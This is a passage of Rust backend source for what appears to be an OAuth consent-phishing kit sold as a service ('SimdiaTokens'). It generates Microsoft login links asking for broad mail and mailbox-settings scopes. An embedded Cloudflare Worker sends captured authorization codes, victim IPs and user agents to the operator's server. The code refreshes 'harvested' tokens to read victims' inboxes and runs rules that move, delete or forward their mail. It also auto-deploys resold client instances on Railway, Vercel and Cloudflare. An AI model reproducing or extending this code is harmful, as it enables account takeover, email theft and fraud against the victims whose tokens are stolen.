        let _ = sqlx::query("DELETE FROM ai_analyses WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;

        let r1 = sqlx::query("DELETE FROM harvested WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        match r1 {
            Ok(r) => {
                deleted_harvested += r.rows_affected();
                eprintln!("[delete] Deleted {} rows from harvested for id: {}", r.rows_affected(), id);
            }
            Err(e) => {
                eprintln!("[delete] Error deleting from harvested for id {}: {}", id, e);
            }
        }

        let r2 = sqlx::query("DELETE FROM tokens WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        match r2 {
            Ok(r) => {
                deleted_vault += r.rows_affected();
                eprintln!("[delete] Deleted {} rows from tokens for id: {}", r.rows_affected(), id);
            }
            Err(e) => {
                eprintln!("[delete] Error deleting from tokens for id {}: {}", id, e);
            }
        }
    }

    // Re-enable foreign key constraints
    let _ = sqlx::query("PRAGMA foreign_keys = ON")
        .execute(&state.pool)
        .await;

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "deleted": deleted_harvested + deleted_vault,
        "deleted_harvested": deleted_harvested,
        "deleted_vault": deleted_vault,
    }))
}

#[derive(Serialize)]
struct TokenHealthResponse {
    active: i64,
    expired: i64,
    revoked: i64,
    total: i64,
}

// JSON API: token health counts
async fn tokens_health(state: web::Data<AppState>) -> impl Responder {
    let now = Utc::now();

    let active: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at > ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let expired: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at <= ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let revoked: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE status = 'revoked'"
    )
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let total = active + expired + revoked;

    HttpResponse::Ok().json(TokenHealthResponse { active, expired, revoked, total })
}

// JSON API: get inbox emails for a token
#[derive(Deserialize)]
pub struct InboxApiQuery {
    token_id: String,
}

#[derive(Deserialize)]
pub struct TokenIdQuery {
    token_id: String,
}

async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        // Try to refresh the access token
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = match fresh_access {
            Some(t) => t,
            None => {
                // Fall back to stored access token, but it may be expired
                println!("Failed to refresh token for {}", token.id);
                token.access_token.clone()
            }
        };
        
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        
        match resp {
            Ok(r) => {
                if r.status() == 401 {
                    // Unauthorized – token invalid
                    return HttpResponse::Unauthorized().json(serde_json::json!({
                        "error": "Access token expired and refresh failed. The refresh token may be revoked or expired."
                    }));
                }
                let body: serde_json::Value = r.json().await.unwrap_or_default();
                
                // Run local rules on fetched messages
                if let Some(messages) = body.get("value").and_then(|v| v.as_array()) {
                    let graph_messages: Vec<crate::graph_client::GraphMessage> = messages.iter()
                        .filter_map(|m| serde_json::from_value(m.clone()).ok())
                        .collect();
                    if !graph_messages.is_empty() {
                        let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
                            .unwrap_or_else(|| token.access_token.clone());
                        let (moved, forwarded, matched, deleted) = rules::run_local_rules(&state, &query.token_id, &graph_messages, Some(&access_token)).await;
                        if matched > 0 {
                            println!("[api_inbox] Auto-filtered {} messages for token {} (moved: {}, deleted: {}, forwarded: {})", matched, query.token_id, moved, deleted, forwarded);
                        }
                    }
                }
                
                HttpResponse::Ok().json(body)
            }
            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({
                "error": format!("Request failed: {}", e)
            }))
        }
    } else {
        HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
    }
}

// Generate OAuth link using the deployed worker URL
#[derive(Serialize)]
struct GenerateOAuthLinkResponse {
    link: String,
    worker_url: String,
}

#[derive(Deserialize)]
struct GenerateOAuthLinkQuery {
    local: Option<bool>,
}

async fn generate_oauth_link(
    query: web::Query<GenerateOAuthLinkQuery>,
    state: web::Data<AppState>,
) -> impl Responder {
    let is_local = query.local.unwrap_or(false);
    
    let redirect_uri = if is_local {
        // For local development, use localhost directly or a configured local redirect
        env::var("LOCAL_REDIRECT_URI").unwrap_or_else(|_| {
            let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
            format!("http://localhost:{}/exchange", port)
        })
    } else {
        // Production: use Cloudflare Worker
        let worker_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
        let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
        let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
        format!("{}/oauth/callback", worker_url)
    };

    let scopes = "openid%20offline_access%20User.Read%20Mail.ReadWrite%20Mail.Send%20Contacts.Read%20MailboxSettings.ReadWrite";
    let state_param: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let link = format!(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}&state={}&response_mode=query",
        state.config.client_id,
        redirect_uri,
        scopes,
        state_param
    );

    HttpResponse::Ok().json(GenerateOAuthLinkResponse {
        link,
        worker_url: redirect_uri.clone(),
    })
}

// Embedded worker script for deployment.
// Robust version: never throws an uncaught exception (avoids Cloudflare Error 1101).
// Validates MAIN_SERVER before using it so a missing/placeholder/relative
// value produces a clear 502 instead of crashing the Worker.
const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request).catch(err => {
    console.error('Worker uncaught error: ' + err);
    return new Response('Worker error: ' + (err && err.message ? err.message : err), { status: 502, headers: { 'Content-Type': 'text/plain' } });
  }));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const _MAIN_SERVER = (typeof MAIN_SERVER !== 'undefined' ? (MAIN_SERVER || '') : '').trim();
  const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
  const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
  const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';

  if (url.pathname === '/start') {
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
    return Response.redirect(authUrl, 302);
  }

  if (url.pathname === '/oauth/callback') {
    const code = url.searchParams.get('code');
    if (!code) return new Response('Missing authorization code', { status: 400 });

    // MAIN_SERVER must be an absolute URL or the backend exchange and the
    // final redirect will fail. Fail gracefully instead of throwing.
    if (!_MAIN_SERVER || !/^https?:\/\//.test(_MAIN_SERVER)) {
      return new Response('Worker is not configured. Set MAIN_SERVER to your SimdiaTokens backend URL (e.g. https://your-app.up.railway.app) in this Worker\'s environment variables.', { status: 502, headers: { 'Content-Type': 'text/plain' } });
    }

    const userAgent = request.headers.get('User-Agent') || '';
    const acceptLanguage = request.headers.get('Accept-Language') || '';

    let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
    if (!userIp) {
      const xff = request.headers.get('X-Forwarded-For');
      if (xff) {
        userIp = xff.split(',')[0].trim();
      }
    }
    if (!userIp) {
      userIp = 'unknown';
    }

    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}&ua=${encodeURIComponent(userAgent)}&lang=${encodeURIComponent(acceptLanguage)}`;
    let tokenId = '';
    try {
      const resp = await fetch(exchangeUrl, { method: 'GET' });
      if (resp.ok) {
        const data = await resp.json();
        if (data.token_id) tokenId = data.token_id;
      } else {
        console.error('Backend exchange failed: ' + resp.status);
      }
    } catch (err) { console.error('Failed to reach backend: ' + err); }
    const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
    return Response.redirect(successUrl, 302);
  }

  if (url.pathname === '/status') {
    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER || '(not set)', redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response('Not Found', { status: 404 });
}
"#;

#[derive(Serialize)]
struct DeployWorkerResponse {
    success: bool,
    worker_url: String,
    message: String,
}

// Deploy worker to Cloudflare using their REST API
async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_ACCOUNT_ID env var not set"
        })),
    };
    let cf_api_token = match env::var("CF_API_TOKEN") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_API_TOKEN env var not set"
        })),
    };

    let script_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());

    let main_server = format!("https://{}", env::var("RAILWAY_PUBLIC_DOMAIN")
        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
        .unwrap_or_else(|_| "simdiatokens-v2-production.up.railway.app".to_string()));

    let redirect_uri = format!("https://{}.{}/oauth/callback", script_name, workers_subdomain);

    // Build metadata with text bindings
    // body_part tells Cloudflare which multipart part contains the script
    let metadata = serde_json::json!({
        "body_part": "script",
        "bindings": [
            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
        ]
    });

    let url = format!(
        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
        cf_account_id, script_name
    );

    let form = reqwest::multipart::Form::new()
        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
            .mime_str("application/json").unwrap())
        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
            .file_name("index.js")
            .mime_str("application/javascript").unwrap());

    println!("[deploy] Uploading worker to {}", url);
    println!("[deploy] Redirect URI: {}", redirect_uri);

    let res = match state.http_client
        .put(&url)
        .header("Authorization", format!("Bearer {}", cf_api_token))
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[deploy] Cloudflare API request failed: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "success": false,
                "message": format!("Cloudflare API request failed: {}", e)
            }));
        }
    };

    let status = res.status();
    let body_text = res.text().await.unwrap_or_default();

    println!("[deploy] Cloudflare response {}: {}", status, body_text);

    if status.is_success() {
        let worker_url = format!("https://{}.{}", script_name, workers_subdomain);
        HttpResponse::Ok().json(DeployWorkerResponse {
            success: true,
            worker_url,
            message: "Worker deployed successfully".to_string(),
        })
    } else {
        HttpResponse::InternalServerError().json(serde_json::json!({
            "success": false,
            "message": format!("Cloudflare API returned {}: {}", status, body_text)
        }))
    }
}

// ============================================================
// ONE-CLICK DEPLOY — Automated client deployment
// ============================================================

#[derive(Deserialize)]
struct OneClickDeployRequest {
    admin_username: String,
    admin_email: String,
    admin_password: String,
    subscription_days: i32,
    client_name: String,
    /// Optional real Railway backend URL. If provided, the Cloudflare Worker
    /// is deployed with MAIN_SERVER set to this URL (no manual Cloudflare
    /// step needed). If omitted, a placeholder is used and the user must run
    /// the "Finalize Worker" step (or update MAIN_SERVER manually) after
    /// Railway is live.
    api_url: Option<String>,
    /// Per-client Railway API token. If provided, the backend auto-creates
    /// a Railway project + service with all env vars, a volume, and triggers
    /// a deploy — no manual Railway dashboard step needed.
    railway_api_token: Option<String>,
    /// Per-client Vercel API token. If provided, the backend auto-creates a
    /// Vercel project with all env vars — no manual Vercel dashboard step.
    vercel_api_token: Option<String>,
    /// Optional Vercel team ID (if deploying under a team).
    vercel_team_id: Option<String>,
    /// GitHub repo to deploy from (defaults to "simdie/simdiatokens-v2").
    /// For separate GitHub accounts, use the fork's full name e.g. "otheruser/simdiatokens-v2".
    github_repo: Option<String>,
}

#[derive(Serialize)]
struct OneClickDeployResponse {
    success: bool,
    message: String,
    worker_url: String,
    worker_name: String,
    redirect_uri: String,
    frontend_url: String,
    api_url: String,
    railway_env_config: String,
    vercel_env_config: String,
    admin_id: String,
    azure_redirect_instructions: String,
    manual_steps: Vec<String>,
    /// True if Railway was auto-deployed via API.
    railway_auto_deployed: bool,
    /// True if Vercel was auto-deployed via API.
    vercel_auto_deployed: bool,
}

/// Push the worker script to Cloudflare with the given bindings.
/// Returns Ok(worker_url) on success or an error message on failure.
async fn push_worker_to_cloudflare(
    state: &web::Data<AppState>,
    cf_account_id: &str,
    cf_api_token: &str,
    worker_name: &str,
    workers_subdomain: &str,
    main_server: &str,
    redirect_uri: &str,
) -> Result<String, String> {
    let metadata = serde_json::json!({
        "body_part": "script",
        "bindings": [
            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
        ]
    });

    let cf_url = format!(
        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
        cf_account_id, worker_name
    );

    let form = reqwest::multipart::Form::new()
        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
            .mime_str("application/json").unwrap())
        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
            .file_name("index.js")
            .mime_str("application/javascript").unwrap());

    let cf_res = state.http_client
        .put(&cf_url)
        .header("Authorization", format!("Bearer {}", cf_api_token))
        .multipart(form)
        .send()
        .await;

    match cf_res {
        Ok(r) if r.status().is_success() => {
            Ok(format!("https://{}.{}", worker_name, workers_subdomain))
        }
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            Err(format!("Cloudflare API returned {}: {}", status, body_text))
        }
        Err(e) => Err(format!("Cloudflare API request failed: {}", e)),
    }
}

/// Normalize a user-provided API URL: trim, strip trailing slashes, and
/// ensure it has a scheme. Returns None if the value is empty/invalid.
fn normalize_api_url(raw: &str) -> Option<String> {
    let trimmed = raw.trim().trim_end_matches('/').to_string();
    if trimmed.is_empty() {
        return None;
    }
    if !trimmed.starts_with("http://") && !trimmed.starts_with("https://") {
        return Some(format!("https://{}", trimmed));
    }
    Some(trimmed)
}

// ============================================================
// RAILWAY API — auto-create Railway project + service + deploy
// ============================================================

async fn railway_graphql(
    token: &str,
    query: &str,
    variables: serde_json::Value,
) -> Result<serde_json::Value, String> {
    let body = serde_json::json!({ "query": query, "variables": variables });
    let res = reqwest::Client::new()
        .post("https://backboard.railway.com/graphql/v2")
        .header("Authorization", format!("Bearer {}", token))
        .header("Content-Type", "application/json")
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("Railway API request failed: {}", e))?;
    let status = res.status();
    let text = res.text().await.unwrap_or_default();
    if !status.is_success() {
        return Err(format!("Railway API returned {}: {}", status, text));
    }
    let json: serde_json::Value = serde_json::from_str(&text)
        .map_err(|e| format!("Failed to parse Railway response: {}", e))?;
    if let Some(errors) = json.get("errors") {
        return Err(format!("Railway GraphQL errors: {}", errors));
    }
    Ok(json.get("data").cloned().unwrap_or(serde_json::Value::Null))
}

/// Auto-deploy a Railway backend service for a new client.
/// Returns the public Railway URL on success.
async fn deploy_to_railway(
    railway_token: &str,
    project_name: &str,
    github_repo: &str,
    env_vars: &serde_json::Value,
) -> Result<String, String> {
    // 1. Create project
    let project_data = railway_graphql(
        railway_token,
        r#"mutation projectCreate($input: ProjectCreateInput!) {
            projectCreate(input: $input) { id }
        }"#,
        serde_json::json!({ "input": { "name": project_name } }),
    ).await?;
    let project_id = project_data
        .get("projectCreate").and_then(|v| v.get("id")).and_then(|v| v.as_str())
        .ok_or("Failed to get project ID from Railway")?;

    // 2. Get default environment
    let env_data = railway_graphql(
        railway_token,
        r#"query environments($projectId: String!) {
            environments(projectId: $projectId) {
                edges { node { id name } }
            }
        }"#,
        serde_json::json!({ "projectId": project_id }),
    ).await?;
    let environment_id = env_data
        .get("environments").and_then(|v| v.get("edges")).and_then(|v| v.as_array())
        .and_then(|arr| arr.first()).and_then(|e| e.get("node"))
        .and_then(|n| n.get("id")).and_then(|v| v.as_str())
        .ok_or("Failed to get environment ID from Railway")?;

    // 3. Create service from GitHub repo with initial env vars
    let service_data = railway_graphql(
        railway_token,
        r#"mutation serviceCreate($input: ServiceCreateInput!) {
            serviceCreate(input: $input) { id }
        }"#,
        serde_json::json!({
            "input": {
                "projectId": project_id,
                "name": "api",
                "source": { "repo": github_repo },
                "variables": env_vars,
            }
        }),
    ).await?;
    let service_id = service_data
        .get("serviceCreate").and_then(|v| v.get("id")).and_then(|v| v.as_str())
        .ok_or("Failed to get service ID from Railway")?;

    // 4. Set root directory for monorepo
    let _ = railway_graphql(
        railway_token,
        r#"mutation serviceInstanceUpdate($serviceId: String!, $environmentId: String!, $input: ServiceInstanceUpdateInput!) {
            serviceInstanceUpdate(serviceId: $serviceId, environmentId: $environmentId, input: $input)
        }"#,
        serde_json::json!({
            "serviceId": service_id,
            "environmentId": environment_id,
            "input": { "rootDirectory": "SimdiaTokens/simdiatokens_server" }
        }),
    ).await;

    // 5. Create volume at /app/data
    let _ = railway_graphql(
        railway_token,
        r#"mutation volumeCreate($input: VolumeCreateInput!) {
            volumeCreate(input: $input) { id }
        }"#,
        serde_json::json!({
            "input": {
                "projectId": project_id,
                "serviceId": service_id,
                "mountPath": "/app/data",
                "environmentId": environment_id,
            }
        }),
    ).await;

    // 6. Create public domain
    let domain_data = railway_graphql(
        railway_token,
        r#"mutation serviceDomainCreate($input: ServiceDomainCreateInput!) {
            serviceDomainCreate(input: $input) { domain }
        }"#,
        serde_json::json!({
            "input": { "serviceId": service_id, "environmentId": environment_id }
        }),
    ).await?;
    let domain = domain_data
        .get("serviceDomainCreate").and_then(|v| v.get("domain")).and_then(|v| v.as_str())
        .ok_or("Failed to get domain from Railway")?;

    // 7. Trigger deployment
    let _ = railway_graphql(
        railway_token,
        r#"mutation serviceInstanceDeployV2($serviceId: String!, $environmentId: String!) {
            serviceInstanceDeployV2(serviceId: $serviceId, environmentId: $environmentId)
        }"#,
        serde_json::json!({
            "serviceId": service_id,
            "environmentId": environment_id,
        }),
    ).await;

    Ok(format!("https://{}", domain))
}

// ============================================================
// VERCEL API — auto-create Vercel project + deploy
// ============================================================

/// Auto-deploy a Vercel frontend project for a new client.
/// Returns the Vercel URL on success.
async fn deploy_to_vercel(
    vercel_token: &str,
    team_id: Option<&str>,
    project_name: &str,
    github_repo: &str,
    env_vars: &[(&str, &str)],
) -> Result<String, String> {
    let mut url = "https://api.vercel.com/v11/projects".to_string();
    if let Some(tid) = team_id {
        if !tid.is_empty() {
            url.push_str(&format!("?teamId={}", tid));
        }
    }

    let environment_variables: Vec<serde_json::Value> = env_vars
        .iter()
        .map(|(key, value)| serde_json::json!({
            "key": key, "value": value, "type": "plain",
            "target": ["production", "preview", "development"],
        }))
        .collect();

    let body = serde_json::json!({
        "name": project_name,
        "framework": "nextjs",
        "rootDirectory": "SimdiaTokens-frontend",
        "gitRepository": { "type": "github", "repo": github_repo },
        "buildCommand": "next build",
        "installCommand": "npm ci",
        "environmentVariables": environment_variables,
    });

    let res = reqwest::Client::new()
        .post(&url)
        .header("Authorization", format!("Bearer {}", vercel_token))
        .header("Content-Type", "application/json")
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("Vercel API request failed: {}", e))?;
    let status = res.status();
    let text = res.text().await.unwrap_or_default();
    if !status.is_success() {
        return Err(format!("Vercel API returned {}: {}", status, text));
    }
    let json: serde_json::Value = serde_json::from_str(&text)
        .map_err(|e| format!("Failed to parse Vercel response: {}", e))?;
    let name = json.get("name").and_then(|v| v.as_str()).unwrap_or(project_name);
    Ok(format!("https://{}.vercel.app", name))
}

/// One-Click Deploy: Creates a Cloudflare Worker, generates env configs
/// for Railway and Vercel, and registers the admin in the super admin DB.
/// The user only needs to manually create Railway + Vercel services and
/// paste the generated env configs. If `api_url` is provided, the Worker
/// is deployed fully configured (MAIN_SERVER = real Railway URL) and no
/// manual Cloudflare step is required.
async fn one_click_deploy_handler(
    body: web::Json<OneClickDeployRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_ACCOUNT_ID env var not set"})),
    };
    let cf_api_token = match env::var("CF_API_TOKEN") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_API_TOKEN env var not set"})),
    };
    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
    let client_id = state.config.client_id.clone();

    // Generate unique worker name based on client name
    let client_slug = body.client_name.to_lowercase()
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '-')
        .collect::<String>()
        .replace(" ", "-");
    let worker_name = format!("simdia-{}-worker", client_slug);
    let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
    let redirect_uri = format!("{}/oauth/callback", worker_url);
    let github_repo = body.github_repo.clone().unwrap_or_else(|| "simdie/simdiatokens-v2".to_string());

    // Generate secrets for this client
    let jwt_secret = uuid::Uuid::new_v4().to_string().replace("-", "");
    let master_secret = uuid::Uuid::new_v4().to_string().replace("-", "");

    // Build Railway env vars as JSON (for API auto-deploy) and as text (for manual fallback)
    let openai_key = std::env::var("OPENAI_API_KEY").unwrap_or_else(|_| "".to_string());
    let railway_env_json = serde_json::json!({
        "DATABASE_URL": "sqlite:///app/data/simdiatokens.db",
        "JWT_SECRET": jwt_secret,
        "MASTER_SECRET": master_secret,
        "CLIENT_ID": client_id,
        "CLIENT_SECRET": state.config.client_secret,
        "REDIRECT_URI": redirect_uri,
        "SEED_ADMIN_USERNAME": body.admin_username,
        "SEED_ADMIN_EMAIL": body.admin_email,
        "SEED_ADMIN_PASSWORD": body.admin_password,
        "OPENAI_API_KEY": openai_key,
        "CF_API_TOKEN": cf_api_token,
        "CF_ACCOUNT_ID": cf_account_id,
        "CF_WORKER_NAME": worker_name,
        "CF_WORKERS_SUBDOMAIN": workers_subdomain,
    });
    let railway_env = format!(
        r#"DATABASE_URL=sqlite:///app/data/simdiatokens.db
JWT_SECRET={}
MASTER_SECRET={}
CLIENT_ID={}
CLIENT_SECRET={}
REDIRECT_URI={}
SEED_ADMIN_USERNAME={}
SEED_ADMIN_EMAIL={}
SEED_ADMIN_PASSWORD={}
OPENAI_API_KEY={}
CF_API_TOKEN={}
CF_ACCOUNT_ID={}
CF_WORKER_NAME={}
CF_WORKERS_SUBDOMAIN={}"#,
        jwt_secret, master_secret, client_id, state.config.client_secret, redirect_uri,
        body.admin_username, body.admin_email, body.admin_password,
        openai_key, cf_api_token, cf_account_id, worker_name, workers_subdomain,
    );

    // === Step 1: Auto-deploy Railway if token provided ===
    let mut railway_auto_deployed = false;
    let mut railway_url: String = body.api_url.as_deref().and_then(normalize_api_url)
        .unwrap_or_else(|| format!("https://{}-api.up.railway.app", client_slug));

    if let Some(railway_token) = &body.railway_api_token {
        let railway_token = railway_token.trim();
        if !railway_token.is_empty() {
            let railway_project_name = format!("simdiatokens-{}", client_slug);
            println!("[one-click] Auto-deploying Railway: {}", railway_project_name);
            match deploy_to_railway(railway_token, &railway_project_name, &github_repo, &railway_env_json).await {
                Ok(url) => {
                    println!("[one-click] Railway auto-deployed: {}", url);
                    railway_url = url;
                    railway_auto_deployed = true;
                }
                Err(e) => {
                    eprintln!("[one-click] Railway auto-deploy failed: {}", e);
                }
            }
        }
    }

    // === Step 2: Deploy the Cloudflare Worker (with real Railway URL if available) ===
    let worker_main_server = railway_url.clone();
    let worker_deployed = match push_worker_to_cloudflare(
        &state, &cf_account_id, &cf_api_token, &worker_name, &workers_subdomain,
        &worker_main_server, &redirect_uri,
    ).await {
        Ok(_url) => {
            println!("[one-click] Deployed worker: {} (MAIN_SERVER={})", worker_url, worker_main_server);
            true
        }
        Err(e) => {
            eprintln!("[one-click] Worker deploy failed: {}", e);
            false
        }
    };

    // === Step 3: Auto-deploy Vercel if token provided ===
    let mut vercel_auto_deployed = false;
    let mut frontend_url = format!("https://{}-simdia.vercel.app", client_slug);

    if let Some(vercel_token) = &body.vercel_api_token {
        let vercel_token = vercel_token.trim();
        if !vercel_token.is_empty() {
            let vercel_project_name = format!("{}-simdia", client_slug);
            let vercel_team_id = body.vercel_team_id.as_deref().map(|s| s.trim()).filter(|s| !s.is_empty());
            let vercel_env_vars = vec![
                ("NEXT_PUBLIC_API_URL", railway_url.as_str()),
                ("NEXT_PUBLIC_WORKER_URL", worker_url.as_str()),
            ];
            println!("[one-click] Auto-deploying Vercel: {}", vercel_project_name);
            match deploy_to_vercel(vercel_token, vercel_team_id, &vercel_project_name, &github_repo, &vercel_env_vars).await {
                Ok(url) => {
                    println!("[one-click] Vercel auto-deployed: {}", url);
                    frontend_url = url;
                    vercel_auto_deployed = true;
                }
                Err(e) => {
                    eprintln!("[one-click] Vercel auto-deploy failed: {}", e);
                }
            }
        }
    }

    // Generate Vercel env config text (for manual fallback)
    let vercel_env = format!(
        r#"NEXT_PUBLIC_API_URL={}
NEXT_PUBLIC_WORKER_URL={}"#,
        railway_url, worker_url,
    );

    // === Step 4: Create the admin account in the DB ===
    let admin_id = uuid::Uuid::new_v4().to_string();
    let expires_at = Utc::now() + chrono::Duration::days(body.subscription_days as i64);

    let password_hash = match crate::auth::hash_password(&body.admin_password) {
        Ok(h) => h,
        Err(e) => return HttpResponse::InternalServerError().json(serde_json::json!({"success": false, "message": format!("Password hash failed: {}", e)})),
    };

    let _ = sqlx::query(
        "INSERT INTO users (id, username, email, password_hash, role, super_admin, suspended, expires_at, usage_days, api_url, frontend_url, worker_url, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&admin_id)
    .bind(&body.admin_username)
    .bind(&body.admin_email)
    .bind(&password_hash)
    .bind("admin")
    .bind(false)
    .bind(false)
    .bind(expires_at)
    .bind(body.subscription_days)
    .bind(&railway_url)
    .bind(&frontend_url)
    .bind(&worker_url)
    .bind(Utc::now())
    .execute(&state.pool)
    .await;

    println!("[one-click] Created admin: {} ({})", body.admin_username, admin_id);

    // Build manual steps — only include steps that weren't auto-deployed.
    let mut step_num = 1;
    let mut manual_steps: Vec<String> = vec![];

    if !railway_auto_deployed {
        manual_steps.push(format!("{}. Go to Railway Dashboard -> New Project -> Deploy from GitHub -> select {}", step_num, github_repo));
        step_num += 1;
        manual_steps.push(format!("{}. Set root directory: SimdiaTokens/simdiatokens_server", step_num));
        step_num += 1;
        manual_steps.push(format!("{}. Add volume: mount path /app/data", step_num));
        step_num += 1;
        manual_steps.push(format!("{}. Paste the Railway env config below into Railway Variables", step_num));
        step_num += 1;
        manual_steps.push(format!("{}. Deploy Railway -> copy the generated Railway URL", step_num));
        step_num += 1;
        if !worker_deployed || body.api_url.is_none() {
            manual_steps.push(format!("{}. In the super admin panel, click 'Finalize Worker' and paste the Railway URL", step_num));
            step_num += 1;
        }
    } else {
        manual_steps.push(format!("{}. Railway auto-deployed. Backend URL: {}", step_num, railway_url));
        step_num += 1;
    }

    if !vercel_auto_deployed {
        manual_steps.push(format!("{}. Go to Vercel Dashboard -> Import Project -> {}", step_num, github_repo));
        step_num += 1;
        manual_steps.push(format!("{}. Set root directory: SimdiaTokens-frontend", step_num));
        step_num += 1;
        manual_steps.push(format!("{}. Paste the Vercel env config below into Vercel Environment Variables", step_num));
        step_num += 1;
        manual_steps.push(format!("{}. Deploy Vercel -> copy the Vercel URL", step_num));
        step_num += 1;
    } else {
        manual_steps.push(format!("{}. Vercel auto-deployed. Frontend URL: {}", step_num, frontend_url));
        step_num += 1;
    }

    manual_steps.push(format!("{}. Go to Azure Portal -> App Registration -> Authentication -> Add redirect URI: {}", step_num, redirect_uri));

    let azure_redirect_instructions = format!("Add this redirect URI to Azure AD App Registration: {}", redirect_uri);

    let mut summary = format!("Deployment {} created. Worker {} {}. Admin {} registered.",
        body.client_name, worker_url, if worker_deployed { "deployed" } else { "failed to deploy" }, body.admin_username);
    if railway_auto_deployed {
        summary.push_str(&format!(" Railway auto-deployed: {}.", railway_url));
    }
    if vercel_auto_deployed {
        summary.push_str(&format!(" Vercel auto-deployed: {}.", frontend_url));
    }

    HttpResponse::Ok().json(OneClickDeployResponse {
        success: true,
        message: summary,
        worker_url,
        worker_name,
        redirect_uri,
        frontend_url,
        api_url: railway_url,
        railway_env_config: railway_env,
